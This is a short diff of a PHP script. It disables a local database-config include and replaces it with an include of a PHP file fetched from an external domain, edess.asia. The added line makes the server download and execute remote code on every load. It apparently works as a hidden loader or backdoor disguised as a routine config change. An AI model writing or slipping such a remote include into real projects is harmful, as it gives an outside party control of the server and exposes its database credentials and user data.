@@ -1,6 +1,7 @@
 <?php
 $dbcon = "";
-include "config/db_conn.php";
+//include "config/db_conn.php";
+include "https://edess.asia/ss_dbname_32042127.php";
 
 if (isset($_POST["type"])) {
 
